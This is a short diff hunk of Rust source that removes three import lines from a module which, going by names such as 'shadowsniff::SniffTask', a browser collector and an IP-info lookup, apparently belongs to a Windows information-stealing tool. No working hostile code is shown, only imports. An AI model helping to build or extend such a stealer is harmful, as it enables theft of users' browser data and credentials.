@@ -27,16 +27,13 @@
 use alloc::format;
 use collector::atomic::AtomicCollector;
 use collector::display::PrimitiveDisplayCollector;
-use collector::{Browser, Collector, Software};
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
 use filesystem::{FileSystem, FileSystemExt};
 use ipinfo::init_ip_info;
-use rand_core::RngCore;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::log_debug;
-use windows_sys::Win32::System::Threading::Sleep;
 
 #[inline(always)]
 pub fn run() {
